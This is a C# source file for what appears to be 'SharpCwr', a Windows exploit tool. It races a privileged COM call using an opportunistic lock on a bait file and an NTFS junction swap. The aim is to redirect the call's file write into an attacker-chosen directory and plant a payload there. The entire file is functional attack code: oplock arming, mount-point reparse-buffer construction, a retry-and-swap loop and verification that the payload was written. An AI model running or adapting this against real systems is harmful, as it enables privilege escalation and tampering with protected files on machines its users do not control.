using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace SharpCwr {

internal static class Native {
  public const uint GENERIC_READ = 0x80000000;
  public const uint GENERIC_WRITE = 0x40000000;
  public const uint FILE_SHARE_READ = 0x00000001;
  public const uint FILE_SHARE_WRITE = 0x00000002;
  public const uint FILE_SHARE_DELETE = 0x00000004;
  public const uint OPEN_EXISTING = 3;
  public const uint FILE_ATTRIBUTE_NORMAL = 0x00000080;
  public const uint FILE_ATTRIBUTE_REPARSE_POINT = 0x00000400;
  public const uint INVALID_FILE_ATTRIBUTES = 0xFFFFFFFF;
  public const uint FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;
  public const uint FILE_FLAG_OPEN_REPARSE_POINT = 0x00200000;
  public const uint FILE_FLAG_OVERLAPPED = 0x40000000;
  public const uint FSCTL_SET_REPARSE_POINT = 0x000900A4;
  public const uint FSCTL_REQUEST_OPLOCK = 0x00090240;
  public const uint FSCTL_REQUEST_OPLOCK_LEVEL_1 = 0x00090020;
  public const uint IO_REPARSE_TAG_MOUNT_POINT = 0xA0000003;
  public const uint OPLOCK_LEVEL_CACHE_READ = 0x00000001;
  public const uint OPLOCK_LEVEL_CACHE_HANDLE = 0x00000002;
  public const uint OPLOCK_LEVEL_CACHE_WRITE = 0x00000004;
  public const uint REQUEST_OPLOCK_INPUT_FLAG_REQUEST = 0x00000001;
  public const ushort REQUEST_OPLOCK_CURRENT_VERSION = 1;
  public const uint ERROR_IO_PENDING = 997;
  public const uint WAIT_OBJECT_0 = 0;
  public const uint WAIT_TIMEOUT = 0x00000102;

  [StructLayout(LayoutKind.Sequential)]
  public struct REQUEST_OPLOCK_INPUT {
    public ushort StructureVersion;
    public ushort StructureLength;
    public uint RequestedOplockLevel;
    public uint Flags;
  }

  [StructLayout(LayoutKind.Sequential)]
  public struct REQUEST_OPLOCK_OUTPUT {
    public ushort StructureVersion;
    public ushort StructureLength;
    public uint OriginalOplockLevel;
    public uint NewOplockLevel;
    public uint Flags;
    public ushort ShareMode;
    public uint DeviceId;
  }

  [DllImport("kernel32.dll", SetLastError = true)]
  public static extern bool DeviceIoControl(
      IntPtr handle, uint code, ref REQUEST_OPLOCK_INPUT inBuffer, uint inSize,
      ref REQUEST_OPLOCK_OUTPUT outBuffer, uint outSize, out uint returned,
      IntPtr overlapped);

  [StructLayout(LayoutKind.Sequential)]
  public struct OVERLAPPED {
    public UIntPtr Internal;
    public UIntPtr InternalHigh;
    public uint Offset;
    public uint OffsetHigh;
    public IntPtr Event;
  }

  [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, EntryPoint = "CreateFileW")]
  public static extern IntPtr CreateFileW(
      string name, uint access, uint share, IntPtr security,
      uint disposition, uint flags, IntPtr template);

  [DllImport("kernel32.dll", SetLastError = true)]
  public static extern bool CloseHandle(IntPtr handle);

  [DllImport("kernel32.dll", SetLastError = true)]
  public static extern bool DeviceIoControl(
      IntPtr handle, uint code, IntPtr inBuffer, uint inSize,
      IntPtr outBuffer, uint outSize, out uint returned, IntPtr overlapped);

  [DllImport("kernel32.dll", SetLastError = true)]
  public static extern bool DeviceIoControl(
      IntPtr handle, uint code, IntPtr inBuffer, uint inSize,
      IntPtr outBuffer, uint outSize, out uint returned, ref OVERLAPPED overlapped);

  [DllImport("kernel32.dll", SetLastError = true)]
  public static extern uint WaitForSingleObject(IntPtr handle, uint milliseconds);

  [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, EntryPoint = "CreateEventW")]
  public static extern IntPtr CreateEventW(IntPtr attributes, bool manualReset, bool initialState, string name);

  [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true, EntryPoint = "GetFileAttributesW")]
  public static extern uint GetFileAttributesW(string name);
}

internal sealed class Oplock : IDisposable {
  private IntPtr file_ = IntPtr.Zero;
  private IntPtr event_ = IntPtr.Zero;
  private IntPtr overlapped_ = IntPtr.Zero;
  private IntPtr inPtr_ = IntPtr.Zero;
  private IntPtr outPtr_ = IntPtr.Zero;

  public void ArmOnFile(string path) {
    event_ = Native.CreateEventW(IntPtr.Zero, true, false, null);
    if (event_ == IntPtr.Zero) throw new Win32Exception(Marshal.GetLastWin32Error());

    overlapped_ = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Native.OVERLAPPED)));
    inPtr_ = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Native.REQUEST_OPLOCK_INPUT)));
    outPtr_ = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(Native.REQUEST_OPLOCK_OUTPUT)));
    var initial = new Native.OVERLAPPED();
    initial.Event = event_;
    Marshal.StructureToPtr(initial, overlapped_, false);

    file_ = Native.CreateFileW(
        path, Native.GENERIC_READ,
        Native.FILE_SHARE_READ | Native.FILE_SHARE_WRITE | Native.FILE_SHARE_DELETE,
        IntPtr.Zero,
        Native.OPEN_EXISTING,
        Native.FILE_ATTRIBUTE_NORMAL | Native.FILE_FLAG_OVERLAPPED, IntPtr.Zero);
    if (file_ == IntPtr.Zero || file_ == new IntPtr(-1)) {
      throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateFileW(bait " + path + ")");
    }

    var input = new Native.REQUEST_OPLOCK_INPUT();
    input.StructureVersion = Native.REQUEST_OPLOCK_CURRENT_VERSION;
    input.StructureLength =
        (ushort)Marshal.SizeOf(typeof(Native.REQUEST_OPLOCK_INPUT));
    input.RequestedOplockLevel = Native.OPLOCK_LEVEL_CACHE_READ |
                                 Native.OPLOCK_LEVEL_CACHE_HANDLE |
                                 Native.OPLOCK_LEVEL_CACHE_WRITE;
    input.Flags = Native.REQUEST_OPLOCK_INPUT_FLAG_REQUEST;

    var output = new Native.REQUEST_OPLOCK_OUTPUT();
    output.StructureVersion = Native.REQUEST_OPLOCK_CURRENT_VERSION;
    output.StructureLength =
        (ushort)Marshal.SizeOf(typeof(Native.REQUEST_OPLOCK_OUTPUT));

    Marshal.StructureToPtr(input, inPtr_, false);
    Marshal.StructureToPtr(output, outPtr_, false);

    uint returned;
    if (Native.DeviceIoControl(
            file_, Native.FSCTL_REQUEST_OPLOCK,
            inPtr_, (uint)Marshal.SizeOf(typeof(Native.REQUEST_OPLOCK_INPUT)),
            outPtr_, (uint)Marshal.SizeOf(typeof(Native.REQUEST_OPLOCK_OUTPUT)),
            out returned, overlapped_)) {
      Native.CloseHandle(file_);
      file_ = IntPtr.Zero;
      throw new InvalidOperationException(
          "FSCTL_REQUEST_OPLOCK completed synchronously (oplock not granted; " +
          "another handle open on the bait?)");
    }
    int error = Marshal.GetLastWin32Error();
    if (error != (int)Native.ERROR_IO_PENDING) {
      throw new Win32Exception(
          error,
          "FSCTL_REQUEST_OPLOCK(" + path + ") failed with Win32 error " + error);
    }
  }

  public bool WaitBreak(int timeoutMs) {
    if (event_ == IntPtr.Zero) return false;
    return Native.WaitForSingleObject(event_, (uint)timeoutMs) == Native.WAIT_OBJECT_0;
  }

  public void Dispose() {
    if (file_ != IntPtr.Zero && file_ != new IntPtr(-1)) { Native.CloseHandle(file_); file_ = IntPtr.Zero; }
    if (event_ != IntPtr.Zero) { Native.CloseHandle(event_); event_ = IntPtr.Zero; }
    if (overlapped_ != IntPtr.Zero) { Marshal.FreeHGlobal(overlapped_); overlapped_ = IntPtr.Zero; }
    if (inPtr_ != IntPtr.Zero) { Marshal.FreeHGlobal(inPtr_); inPtr_ = IntPtr.Zero; }
    if (outPtr_ != IntPtr.Zero) { Marshal.FreeHGlobal(outPtr_); outPtr_ = IntPtr.Zero; }
  }
}

internal static class Junction {
  public static void Create(string linkDirectory, string targetDirectory) {
    Directory.CreateDirectory(targetDirectory);
    if (!Directory.Exists(linkDirectory)) Directory.CreateDirectory(linkDirectory);
    SetMountPoint(linkDirectory, @"\??\" + Path.GetFullPath(targetDirectory));
  }

  public static void SetMountPoint(string linkDirectory, string ntTarget) {
    byte[] buffer = BuildMountPointBuffer(ntTarget);
    IntPtr directory = Native.CreateFileW(
        linkDirectory, Native.GENERIC_WRITE,
        Native.FILE_SHARE_READ | Native.FILE_SHARE_WRITE | Native.FILE_SHARE_DELETE,
        IntPtr.Zero, Native.OPEN_EXISTING,
        Native.FILE_FLAG_OPEN_REPARSE_POINT | Native.FILE_FLAG_BACKUP_SEMANTICS,
        IntPtr.Zero);
    if (directory == IntPtr.Zero || directory == new IntPtr(-1)) {
      throw new Win32Exception(Marshal.GetLastWin32Error(), "CreateFileW(junction " + linkDirectory + ")");
    }
    try {
      var pinned = GCHandle.Alloc(buffer, GCHandleType.Pinned);
      try {
        uint returned;
        if (!Native.DeviceIoControl(
                directory, Native.FSCTL_SET_REPARSE_POINT,
                pinned.AddrOfPinnedObject(), (uint)buffer.Length,
                IntPtr.Zero, 0, out returned, IntPtr.Zero)) {
          throw new Win32Exception(Marshal.GetLastWin32Error(), "FSCTL_SET_REPARSE_POINT(" + linkDirectory + ")");
        }
      } finally {
        pinned.Free();
      }
    } finally {
      Native.CloseHandle(directory);
    }
  }

  public static bool RemoveIfExists(string linkDirectory) {
    uint attributes = Native.GetFileAttributesW(linkDirectory);
    if (attributes == Native.INVALID_FILE_ATTRIBUTES ||
        (attributes & Native.FILE_ATTRIBUTE_REPARSE_POINT) == 0) {
      return false;
    }
    Directory.Delete(linkDirectory, false);
    return true;
  }

  private static byte[] BuildMountPointBuffer(string ntTarget) {
    byte[] substitute = Encoding.Unicode.GetBytes(ntTarget);
    byte[] print = Encoding.Unicode.GetBytes(ntTarget);
    int pathBytes = substitute.Length + 2 + print.Length + 2;
    int reparseDataLength = 8 + pathBytes;
    int total = 16 + pathBytes;
    var buffer = new byte[total];
    Array.Copy(BitConverter.GetBytes((uint)Native.IO_REPARSE_TAG_MOUNT_POINT), 0, buffer, 0, 4);
    buffer[4] = (byte)(reparseDataLength & 0xFF);
    buffer[5] = (byte)((reparseDataLength >> 8) & 0xFF);
    buffer[8] = 0;
    buffer[9] = 0;
    buffer[10] = (byte)(substitute.Length & 0xFF);
    buffer[11] = (byte)((substitute.Length >> 8) & 0xFF);
    int printOffset = substitute.Length + 2;
    buffer[12] = (byte)(printOffset & 0xFF);
    buffer[13] = (byte)((printOffset >> 8) & 0xFF);
    buffer[14] = (byte)(print.Length & 0xFF);
    buffer[15] = (byte)((print.Length >> 8) & 0xFF);
    Array.Copy(substitute, 0, buffer, 16, substitute.Length);
    Array.Copy(print, 0, buffer, 16 + printOffset, print.Length);
    return buffer;
  }
}

public static class ComInvoke {
  public static object Invoke(TargetDefinition target, ResolvedRun plan) {
    var clsid = new Guid(target.Clsid);
    var type = Type.GetTypeFromCLSID(clsid);
    if (type == null) {
      throw new InvalidOperationException("CLSID did not resolve to a COM type: " + target.Clsid);
    }
    object instance = Activator.CreateInstance(type);
    try {
      var invokeArgs = new object[plan.Arguments.Count];
      for (int i = 0; i < plan.Arguments.Count; ++i) {
        invokeArgs[i] = Coerce(plan.Arguments[i].Type, plan.Arguments[i].Value);
      }
      return type.InvokeMember(
          target.Method, BindingFlags.InvokeMethod, null, instance, invokeArgs);
    } finally {
      if (instance != null && Marshal.IsComObject(instance)) {
        Marshal.ReleaseComObject(instance);
      }
    }
  }

  private static object Coerce(string type, string value) {
    switch (type) {
      case "string":
      case "path":
        return value;
      case "int32": return int.Parse(value, CultureInfo.InvariantCulture);
      case "uint32": return uint.Parse(value, CultureInfo.InvariantCulture);
      case "int64": return long.Parse(value, CultureInfo.InvariantCulture);
      case "bool": return value == "true" || value == "1";
      default:
        throw new FormatException("unsupported method argument type: " + type);
    }
  }

  private static class CultureInfo {
    public static System.Globalization.CultureInfo InvariantCulture {
      get { return System.Globalization.CultureInfo.InvariantCulture; }
    }
  }
}

public sealed class RunResult {
  public bool Success;
  public int Attempts;
  public string Message = "";
  public double TriggerToVerifyMs = -1;
}

public static class Engine {
  public static RunResult Execute(
      TargetDefinition target, ResolvedRun plan,
      bool execute, int attempts, bool verbose, int oplockTimeoutMs,
      string payloadPath, int swapStartOffsetUs) {
    if (!execute) {
      return new RunResult {
        Success = true, Attempts = 0,
        Message = "dry-run complete; no target was modified"
      };
    }
    if (target.Invoker != "idispatch") {
      throw new NotSupportedException(
          "SharpCwr port v1 supports the idispatch invoker only (requested: " +
          target.Invoker + ")");
    }

    RunResult last = null;
    for (int attempt = 1; attempt <= attempts; ++attempt) {
      ResetSafeDirectory(plan);
      File.WriteAllText(plan.BaitPath, plan.Content, new UTF8Encoding(false));

      var oplock = new Oplock();
      Exception invokeError = null;
      object invokeResult = null;
      var worker = new Thread(delegate() {
        try { invokeResult = ComInvoke.Invoke(target, plan); }
        catch (Exception ex) { invokeError = ex; }
      });
      worker.IsBackground = true;

      var clock = Stopwatch.StartNew();
      try {
        oplock.ArmOnFile(plan.BaitPath);
      } catch (Exception ex) {
        oplock.Dispose();
        last = new RunResult {
          Success = false, Attempts = attempt,
          Message = "arm_failed: " + ex.Message
        };
        clock.Stop();
        Thread.Sleep(50);
        continue;
      }
      worker.Start();

      bool broke = oplock.WaitBreak(oplockTimeoutMs);
      oplock.Dispose();

      bool redirectInstalled = false;
      if (broke) {
        if (swapStartOffsetUs > 0) {
          int delayMs = (swapStartOffsetUs + 999) / 1000;
          Thread.Sleep(delayMs);
        }
        redirectInstalled = TrySwap(plan, verbose);
        if (!redirectInstalled && verbose) {
          Console.Out.WriteLine("[*] attempt=" + attempt + " swap_failed");
        }
      } else if (verbose) {
        Console.Out.WriteLine("[*] attempt=" + attempt + " trigger_timeout");
      }

      int invokeTimeoutMs = oplockTimeoutMs + 30000;
      if (!worker.Join(invokeTimeoutMs)) {
        last = new RunResult {
          Success = false, Attempts = attempt,
          Message = "client_timeout: in-process COM call did not return within " +
                    invokeTimeoutMs + " ms; terminating"
        };
        clock.Stop();
        break;
      }
      clock.Stop();

      string comCallResult = "success";
      if (invokeError != null) comCallResult = "error: " + invokeError.Message;

      bool targetExists = File.Exists(plan.TargetPath);
      bool contentMatch = false;
      if (targetExists) {
        try {
          bool payloadMode = payloadPath.Length > 0 && File.Exists(payloadPath);
          byte[] expected = payloadMode
              ? File.ReadAllBytes(payloadPath)
              : new UTF8Encoding(false).GetBytes(plan.Content);
          byte[] written = File.ReadAllBytes(plan.TargetPath);
          contentMatch = written.Length == expected.Length;
          if (contentMatch) {
            for (int i = 0; i < expected.Length; ++i) {
              if (written[i] != expected[i]) { contentMatch = false; break; }
            }
          }
        } catch {
          contentMatch = false;
        }
      }

      string message = string.Format(
          "attempt={0} trigger={1} redirect={2} com={3} target_exists={4} content_match={5}",
          attempt, broke, redirectInstalled, comCallResult, targetExists, contentMatch);
      bool success = broke && redirectInstalled && targetExists && contentMatch &&
                     comCallResult == "success";
      last = new RunResult {
        Success = success, Attempts = attempt, Message = message,
        TriggerToVerifyMs = clock.Elapsed.TotalMilliseconds
      };
      if (success) break;
    }

    CleanupWorkspace(plan);
    return last;
  }

  private static bool TrySwap(ResolvedRun plan, bool verbose) {
    for (int round = 0; round < 50; ++round) {
      try {
        File.Delete(plan.BaitPath);
      } catch {
      }
      if (!File.Exists(plan.BaitPath)) {
        try {
          Junction.SetMountPoint(plan.SafeDirectory, @"\??\" + plan.TargetDirectory);
          return true;
        } catch (Exception ex) {
          if (verbose) {
            Console.Out.WriteLine("[*] swap retry: " + ex.Message);
          }
        }
      }
      Thread.Sleep(20);
    }
    return false;
  }

  private static void ResetSafeDirectory(ResolvedRun plan) {
    Junction.RemoveIfExists(plan.SafeDirectory);
    try { File.Delete(plan.BaitPath); } catch { }
    if (Directory.Exists(plan.SafeDirectory)) {
      Directory.Delete(plan.SafeDirectory, false);
    }
    Directory.CreateDirectory(plan.SafeDirectory);
  }

  private static void CleanupWorkspace(ResolvedRun plan) {
    try { Junction.RemoveIfExists(plan.SafeDirectory); } catch { }
    try { File.Delete(plan.BaitPath); } catch { }
  }
}

}
